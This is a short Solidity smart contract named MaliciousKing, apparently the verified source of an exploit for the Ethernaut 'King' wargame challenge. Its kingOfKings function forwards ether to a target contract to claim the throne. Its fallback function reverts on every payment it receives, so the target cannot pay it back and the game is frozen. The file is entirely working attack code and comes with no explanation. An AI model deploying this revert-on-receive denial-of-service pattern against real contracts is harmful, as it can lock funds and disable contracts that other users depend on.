/**
 *Submitted for verification at Etherscan.io on 2021-03-13
*/

pragma solidity ^0.6.4;

contract MaliciousKing {

  function kingOfKings(address addr) public payable {
    (bool result, bytes memory data) = addr.call{value:msg.value}("");
    if(!result) revert("The kingOfKings function reverted");
  }
  
   fallback() external payable {  // fallback function that will revert everytime.
        revert("look at me I'm the captain now");
    }

}